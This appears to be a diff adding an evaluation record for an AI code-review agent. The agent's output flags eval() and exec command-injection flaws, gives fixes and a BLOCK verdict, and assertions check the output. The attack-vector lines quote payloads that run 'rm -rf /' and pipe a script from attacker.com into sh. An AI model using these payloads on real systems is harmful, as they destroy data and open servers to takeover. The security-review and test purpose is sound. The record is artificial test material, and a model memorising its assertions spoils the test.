@@ -1,0 +1,38 @@
+{
+  "agent": "code-reviewer",
+  "case_id": "eval-exec-injection",
+  "model": "sonnet",
+  "prompt_hash": "c08928400e09e2736360d80d3a8a5047994e39c4efcf17c07fc0c6d3cd8661da",
+  "output": "## Findings\n\n### 1. BLOCKING — Remote Code Execution via `eval()` on untrusted input\n\n**Severity:** Blocking  \n**CWE:** CWE-94 (Improper Control of Generation of Code / Code Injection)  \n**Evidence:**\n```javascript\nconst payload = eval('(' + req.body + ')');\n```\n**Attack vector:** Any HTTP client sends a body like `); require('child_process').execSync('rm -rf /'); (` — arbitrary server-side JS executes.  \n**Fix:** Replace with `JSON.parse(req.body)`.\n\n---\n\n### 2. BLOCKING — OS Command Injection via unsanitized string interpolation into `exec`\n\n**Severity:** Blocking  \n**CWE:** CWE-78 (Improper Neutralization of Special Elements used in an OS Command)  \n**Evidence:**\n```javascript\nexec(`deploy.sh ${payload.target}`);\n```\n**Attack vector:** `payload.target` = `; curl attacker.com/shell.sh | sh` — arbitrary commands run as the server process.  \n**Fix:** Use `execFile('deploy.sh', [payload.target])` (avoids shell interpolation) and validate `payload.target` against an allowlist of permitted deployment targets.\n\n---\n\n## Verdict: **BLOCK**\n\nTwo critical RCE vulnerabilities. Both must be resolved before merge.",
+  "assertion_results": [
+    {
+      "assertion": {
+        "type": "contains",
+        "value": "BLOCK"
+      },
+      "passed": true,
+      "reason": "output contains value"
+    },
+    {
+      "assertion": {
+        "type": "regex",
+        "value": "CWE-(94|78)|command injection"
+      },
+      "passed": true,
+      "reason": "output matches regex"
+    },
+    {
+      "assertion": {
+        "type": "contains",
+        "value": "eval"
+      },
+      "passed": true,
+      "reason": "output contains value"
+    }
+  ],
+  "passed": true,
+  "input_tokens": 3,
+  "output_tokens": 469,
+  "cost_usd": 0.046564999999999995,
+  "duration_ms": 11830
+}
